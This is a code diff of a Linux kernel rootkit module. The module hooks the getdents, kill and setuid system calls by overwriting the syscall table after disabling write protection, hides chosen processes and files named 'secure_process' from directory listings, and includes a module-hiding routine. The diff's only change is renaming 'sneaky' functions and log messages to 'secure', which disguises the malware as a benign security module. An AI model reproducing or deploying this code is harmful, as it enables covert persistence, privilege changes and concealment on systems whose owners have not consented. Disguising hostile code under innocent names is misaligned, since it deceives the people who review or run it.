@@ -65,12 +65,12 @@ int isInvisible(pid_t pid){
 
 asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 
-asmlinkage int sneaky_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
+asmlinkage int secure_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
   	struct linux_dirent* d;
 	char* name;
 	char d_type;
   	int bpos = 0;
-	int sneaky_len = 0;
+	int secure_len = 0;
 	int* des;
   	int read = original_getdents(fd,dirp,count); 
   	if(read == 0){ 
@@ -87,9 +87,9 @@ asmlinkage int sneaky_getdents(unsigned int fd, struct linux_dirent *dirp, unsig
   		name = d->d_name;
   		d_type = *((char*)dirp+bpos+d->d_reclen-1);
 		if(isInvisible(simple_strtoul(d->d_name, NULL, 10)) || strstr(name,"secure_process") != NULL){
-  			sneaky_len = d->d_reclen;
-  			des = memmove(((char*)dirp+bpos),((char*)dirp+bpos+sneaky_len),read-bpos-sneaky_len);
-  			read -= sneaky_len;
+  			secure_len = d->d_reclen;
+  			des = memmove(((char*)dirp+bpos),((char*)dirp+bpos+secure_len),read-bpos-secure_len);
+  			read -= secure_len;
   		} 
   		else{
  			bpos += d->d_reclen; 
@@ -115,7 +115,7 @@ void HideModule(void){
 }
 
 asmlinkage int (*original_kill)(pid_t pid, int sig);
-asmlinkage int sneaky_kill(pid_t pid, int sig){
+asmlinkage int secure_kill(pid_t pid, int sig){
 	struct task_struct* curp = current;
 	if(sig == SIGSHPROC){ 
 		for_each_process(curp){
@@ -332,9 +332,9 @@ int restore_passwd(char* copypath, char* path){
 }
 
 //The code that gets executed when the module is loaded
-static int initialize_sneaky_module(void)
+static int initialize_secure_module(void)
 {
-  printk(KERN_INFO "Sneaky module being loaded.\n");
+  printk(KERN_INFO "Secure module being loaded.\n");
   unsigned long cr0 = read_cr0();
   clear_bit(16, &cr0);
   write_cr0(cr0);
@@ -346,10 +346,10 @@ static int initialize_sneaky_module(void)
   unsigned long *sys_call_table = GetSysTable();
   //getdents
   original_getdents = (void*)*(sys_call_table + __NR_getdents);  
-  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_getdents; 
+  *(sys_call_table + __NR_getdents) = (unsigned long)secure_getdents; 
   //kill
   original_kill = (void*)*(sys_call_table + __NR_kill);  
-  *(sys_call_table + __NR_kill) = (unsigned long)sneaky_kill;
+  *(sys_call_table + __NR_kill) = (unsigned long)secure_kill;
   //setuid
   origin_setuid = (void*)*(sys_call_table + __NR_setuid);
   *(sys_call_table + __NR_setuid) = (unsigned long)secure_setuid;
@@ -360,9 +360,9 @@ static int initialize_sneaky_module(void)
 }  
 
 
-static void exit_sneaky_module(void) 
+static void exit_secure_module(void) 
 {
-  printk(KERN_INFO "Sneaky module being unloaded.\n"); 
+  printk(KERN_INFO "Secure module being unloaded.\n"); 
   unsigned long cr0 = read_cr0();
   clear_bit(16, &cr0);
   write_cr0(cr0);
@@ -381,6 +381,6 @@ static void exit_sneaky_module(void)
 }  
 
 
-module_init(initialize_sneaky_module);  // what's called upon loading 
-module_exit(exit_sneaky_module);        // what's called upon unloading  
+module_init(initialize_secure_module);  // what's called upon loading 
+module_exit(exit_secure_module);        // what's called upon unloading  
 
